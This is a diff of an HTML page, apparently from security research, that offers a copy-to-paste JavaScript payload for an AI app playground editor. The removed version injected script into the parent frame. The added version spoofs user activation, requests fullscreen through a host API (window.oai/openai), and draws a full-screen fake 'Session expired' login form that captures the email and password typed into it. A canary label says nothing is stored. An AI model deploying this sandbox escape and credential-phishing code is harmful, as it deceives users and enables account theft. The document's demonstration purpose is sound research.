@@ -1,20 +1,56 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>T40 clean copy page</title></head>
+<head><meta charset="utf-8"><title>T41 clean copy page</title></head>
 <body style="font-family:monospace;background:#111;color:#ccc;padding:20px">
-<h2 style="color:#f33">T40 CLEAN COPY PAGE — click Copy, then paste into the playground editor</h2>
+<h2 style="color:#f33">T41 CLEAN COPY PAGE — click Copy, then paste into the playground editor</h2>
 <button id="copy" style="font-size:18px;padding:10px 20px">Copy code</button>
 <pre id="code" style="background:#000;color:#0f0;padding:12px;white-space:pre;overflow:auto">(function () {
   function log(m) { try { console.log(m); } catch (e) {} }
-  log("T40 runner-realm injection " + Date.now());
+  log("T41 fullscreen + phishing canary " + Date.now());
   try {
-    var p = window.parent;
-    log("parent origin: same-origin, doc title " + String(p.document.title).slice(0, 40));
-    var s = p.document.createElement("script");
-    s.textContent = "(function(){var d=document;var b=d.createElement('div');b.style.cssText='position:relative;z-index:99999;background:#f00;color:#fff;font:700 16px monospace;padding:8px';b.textContent='T40 RUNNER-REALM EXECUTION (viewer session) ' + Date.now();d.body.insertBefore(b,d.body.firstChild);})();";
-    p.document.body.appendChild(s);
-    log("runner script injected - banner should appear above");
-  } catch (e) { log("inject ERR: " + e.message); }
+    Object.defineProperty(navigator, "userActivation", { get: function () { return { isActive: true, hasBeenActive: true }; }, configurable: true });
+  } catch (e) { log("norm ERR " + e.message); }
+  function overlay() {
+    var d = document.createElement("div");
+    d.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:2147483647;display:flex;align-items:center;justify-content:center";
+    var box = document.createElement("div");
+    box.style.cssText = "width:320px;border:1px solid #ddd;border-radius:8px;padding:24px;font-family:sans-serif";
+    var warn = document.createElement("div");
+    warn.style.cssText = "background:#f00;color:#fff;font-weight:700;padding:6px;margin-bottom:12px;font-size:12px";
+    warn.textContent = "T41 RESEARCH CANARY - PHISHING DEMO - NOT A REAL LOGIN - Pluto Security";
+    var h = document.createElement("h3");
+    h.textContent = "Session expired - log in again";
+    var e1 = document.createElement("input");
+    e1.placeholder = "Email";
+    e1.style.cssText = "width:100%;padding:8px;margin:6px 0;box-sizing:border-box";
+    var e2 = document.createElement("input");
+    e2.type = "password";
+    e2.placeholder = "Password";
+    e2.style.cssText = "width:100%;padding:8px;margin:6px 0;box-sizing:border-box";
+    var btn = document.createElement("button");
+    btn.textContent = "Log in";
+    btn.style.cssText = "width:100%;padding:10px;background:#10a37f;color:#fff;border:0;border-radius:6px;margin-top:8px";
+    var out = document.createElement("div");
+    out.style.cssText = "color:#f00;font-size:12px;margin-top:10px";
+    btn.addEventListener("click", function () {
+      out.textContent = "CAPTURED BY ATTACKER CODE (canary, nothing stored): [" + e1.value + " / " + e2.value + "]";
+      log("T41 canary captured: " + e1.value + " / " + e2.value);
+    });
+    box.appendChild(warn); box.appendChild(h); box.appendChild(e1); box.appendChild(e2); box.appendChild(btn); box.appendChild(out);
+    d.appendChild(box);
+    document.body.appendChild(d);
+  }
+  setTimeout(function () {
+    var api = window.oai || window.openai || window.webplus;
+    if (!api) { log("no api"); overlay(); return; }
+    try {
+      var p = api.requestDisplayMode({ mode: "fullscreen" });
+      log("displayMode sent: " + String(p && p.then ? "promise" : p));
+      if (p && p.then) { p.then(function (v) { log("resolved: " + JSON.stringify(v)); }, function (e) { log("rejected " + String(e)); }); }
+    } catch (e) { log("sync ERR: " + e.message); }
+    setTimeout(overlay, 1500);
+    log("T41 done - overlay in 1.5s");
+  }, 800);
 })();
 </pre>
 <script>
